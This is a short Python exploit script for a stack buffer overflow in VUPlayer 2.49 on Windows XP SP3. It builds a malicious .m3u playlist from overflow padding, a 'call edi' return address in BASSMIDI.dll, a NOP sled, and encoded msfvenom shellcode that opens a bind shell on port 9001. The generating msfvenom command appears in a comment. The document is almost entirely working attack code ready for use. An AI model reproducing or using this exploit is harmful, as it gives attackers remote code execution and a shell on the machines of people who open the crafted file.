# Exploit for VUPlayer 2.49 - Stack buffer Overflow
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.m3u", "wb")

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xb8\xda\xa5\x42\x0c\xdb\xd6\xd9\x74\x24"
shellcode_bind += b"\xf4\x5a\x31\xc9\xb1\x53\x83\xea\xfc\x31"
shellcode_bind += b"\x42\x0e\x03\x98\xab\xa0\xf9\xe0\x5c\xa6"
shellcode_bind += b"\x02\x18\x9d\xc7\x8b\xfd\xac\xc7\xe8\x76"
shellcode_bind += b"\x9e\xf7\x7b\xda\x13\x73\x29\xce\xa0\xf1"
shellcode_bind += b"\xe6\xe1\x01\xbf\xd0\xcc\x92\xec\x21\x4f"
shellcode_bind += b"\x11\xef\x75\xaf\x28\x20\x88\xae\x6d\x5d"
shellcode_bind += b"\x61\xe2\x26\x29\xd4\x12\x42\x67\xe5\x99"
shellcode_bind += b"\x18\x69\x6d\x7e\xe8\x88\x5c\xd1\x62\xd3"
shellcode_bind += b"\x7e\xd0\xa7\x6f\x37\xca\xa4\x4a\x81\x61"
shellcode_bind += b"\x1e\x20\x10\xa3\x6e\xc9\xbf\x8a\x5e\x38"
shellcode_bind += b"\xc1\xcb\x59\xa3\xb4\x25\x9a\x5e\xcf\xf2"
shellcode_bind += b"\xe0\x84\x5a\xe0\x43\x4e\xfc\xcc\x72\x83"
shellcode_bind += b"\x9b\x87\x79\x68\xef\xcf\x9d\x6f\x3c\x64"
shellcode_bind += b"\x99\xe4\xc3\xaa\x2b\xbe\xe7\x6e\x77\x64"
shellcode_bind += b"\x89\x37\xdd\xcb\xb6\x27\xbe\xb4\x12\x2c"
shellcode_bind += b"\x53\xa0\x2e\x6f\x3c\x05\x03\x8f\xbc\x01"
shellcode_bind += b"\x14\xfc\x8e\x8e\x8e\x6a\xa3\x47\x09\x6d"
shellcode_bind += b"\xc4\x7d\xed\xe1\x3b\x7e\x0e\x28\xf8\x2a"
shellcode_bind += b"\x5e\x42\x29\x53\x35\x92\xd6\x86\xa0\x9a"
shellcode_bind += b"\x71\x79\xd7\x67\xc1\x29\x57\xc7\xaa\x23"
shellcode_bind += b"\x58\x38\xca\x4b\xb2\x51\x63\xb6\x3d\x7e"
shellcode_bind += b"\x5d\x3f\xdb\xea\x8d\x69\x73\x82\x6f\x4e"
shellcode_bind += b"\x4c\x35\x8f\xa4\xe4\xd1\xd8\xae\x33\xde"
shellcode_bind += b"\xd8\xe4\x13\x48\x53\xeb\xa7\x69\x64\x26"
shellcode_bind += b"\x80\xfe\xf3\xbc\x41\x4d\x65\xc0\x4b\x25"
shellcode_bind += b"\x06\x53\x10\xb5\x41\x48\x8f\xe2\x06\xbe"
shellcode_bind += b"\xc6\x66\xbb\x99\x70\x94\x46\x7f\xba\x1c"
shellcode_bind += b"\x9d\xbc\x45\x9d\x50\xf8\x61\x8d\xac\x01"
shellcode_bind += b"\x2e\xf9\x60\x54\xf8\x57\xc7\x0e\x4a\x01"
shellcode_bind += b"\x91\xfd\x04\xc5\x64\xce\x96\x93\x68\x1b"
shellcode_bind += b"\x61\x7b\xd8\xf2\x34\x84\xd5\x92\xb0\xfd"
shellcode_bind += b"\x0b\x03\x3e\xd4\x8f\x23\xdd\xfc\xe5\xcb"
shellcode_bind += b"\x78\x95\x47\x96\x7a\x40\x8b\xaf\xf8\x60"
shellcode_bind += b"\x74\x54\xe0\x01\x71\x10\xa6\xfa\x0b\x09"
shellcode_bind += b"\x43\xfc\xb8\x2a\x46"

junk  = "A" * 1012
jmp   = "\x09\x71\x60\x10"   # 0x10607109 : call edi BASSMIDI.dll
junk2 = "B" * 876
nops  = "\x90" * 20
junk3 = "C" * (5000-1012-4-len(shellcode_bind+nops))

buffer = junk + jmp + junk2 + nops + shellcode_bind + junk3

file.write(buffer)
file.close()
